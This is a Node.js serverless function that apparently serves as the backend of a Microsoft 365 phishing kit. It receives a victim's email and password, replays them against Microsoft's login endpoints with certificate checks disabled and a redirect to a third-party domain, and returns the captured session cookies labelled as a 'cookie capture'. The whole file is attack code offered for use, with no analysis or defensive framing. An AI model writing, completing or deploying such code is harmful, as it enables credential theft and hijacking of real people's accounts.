const fetch = require('node-fetch');
const tough = require('tough-cookie');
const http = require('http');
const https = require('https');

// Create a cookie jar to store cookies
const Cookie = tough.Cookie;
const CookieJar = tough.CookieJar;
const jar = new CookieJar();

const agent = new https.Agent({
    keepAlive: true,
    rejectUnauthorized: false
});

exports.handler = async (event) => {
    try {
        console.log('🔐 captureFromMicrosoft function called');

        const { email, password } = JSON.parse(event.body);

        console.log('📧 Email:', email);
        console.log('🔑 Password: ***');

        // Step 1: Get the login page
        console.log('📄 Step 1: Fetching Microsoft login page...');
        
        const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&scope=https://graph.microsoft.com/.default&redirect_uri=https://vaultydocs.com/auth/callback&response_mode=query&login_hint=${encodeURIComponent(email)}&prompt=login`;

        let response = await fetch(authUrl, {
            method: 'GET',
            agent: agent,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            redirect: 'follow'
        });

        console.log('📊 Response status:', response.status);

        // Extract cookies from Set-Cookie headers
        const setCookieHeaders = response.headers.get('set-cookie');
        console.log('🍪 Cookies received:', !!setCookieHeaders);

        if (!setCookieHeaders) {
            console.log('⚠️ No cookies in first request');
        }

        // Step 2: Try to authenticate with credentials
        console.log('🔐 Step 2: Attempting authentication...');

        const loginPayload = new URLSearchParams({
            username: email,
            password: password,
            AuthMethod: 'FormsAuthentication',
            ctx: '',
            flowToken: ''
        });

        response = await fetch('https://login.microsoftonline.com/common/login', {
            method: 'POST',
            agent: agent,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://login.microsoftonline.com/'
            },
            body: loginPayload.toString(),
            redirect: 'follow'
        });

        console.log('📊 Auth response status:', response.status);

        // Extract all cookies from all responses
        const allCookies = [];
        const cookieHeaders = response.headers.raw()['set-cookie'] || [];
        
        cookieHeaders.forEach(cookieHeader => {
            const parts = cookieHeader.split(';');
            const cookiePart = parts[0];
            const [name, value] = cookiePart.split('=');
            
            if (name && value) {
                allCookies.push({
                    name: name.trim(),
                    value: value.trim(),
                    domain: 'login.microsoftonline.com',
                    path: '/',
                    secure: true,
                    sameSite: 'None',
                    httpOnly: true
                });
            }
        });

        console.log('🍪 Total cookies captured:', allCookies.length);

        return {
            statusCode: 200,
            body: JSON.stringify({
                success: true,
                cookies: allCookies,
                email: email,
                timestamp: new Date().toISOString(),
                captureSource: 'backend-microsoft-auth',
                cookieCount: allCookies.length
            })
        };

    } catch (error) {
        console.error('❌ Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({
                success: false,
                error: 'Cookie capture failed',
                message: error.message
            })
        };
    }
};
